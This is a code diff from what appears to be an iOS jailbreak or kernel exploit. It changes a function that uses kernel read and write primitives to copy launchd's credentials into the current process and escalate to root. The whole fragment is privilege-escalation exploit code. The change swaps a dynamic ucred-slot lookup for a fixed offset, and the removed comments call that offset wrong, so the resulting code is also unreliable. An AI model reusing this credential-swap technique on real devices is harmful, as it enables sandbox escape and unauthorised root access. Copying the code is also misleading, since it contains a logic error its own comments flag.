@@ -272,25 +272,11 @@ int sandbox_elevate_to_root(uint64_t self_proc) {
     }
     NSLog(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
 
-    // Find our proc_ro and the correct ucred slot dynamically —
-    // same scan used in sandbox_escape so offsets always match.
-    uint64_t our_ucred = 0;
-    uint32_t ucred_off = 0;
-    if (sbx_find_ucred_slot(self_proc, &our_ucred, &ucred_off) != 0) {
-        NSLog(@"[SBX] elevate: failed to locate our ucred slot");
-        return -1;
-    }
-    NSLog(@"[SBX] elevate: our ucred=0x%llx at proc_ro+0x%x", our_ucred, ucred_off);
+    uint64_t ourucredraw = early_kread64(self_proc + 0x10);
+    uint64_t ourucred = S(ourucredraw);
+    NSLog(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
 
-    // Write launchd ucred into our proc_ro at the same offset we found it.
-    // Old code wrote to self_proc+0x10 (the proc struct directly) which is
-    // wrong — ucred lives inside proc_ro, not proc. That's why uid stayed 501.
-    uint64_t our_proc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
-    early_kwrite64(our_proc_ro + ucred_off, launchducred);
-
-    // Memory barrier: flush the write before asking the kernel for uid.
-    __asm__ volatile("dsb sy" ::: "memory");
-    usleep(5000);
+    early_kwrite64(self_proc + 0x10, launchducred);
 
     if (getuid() == 0) {
         NSLog(@"[SBX] elevate success!");
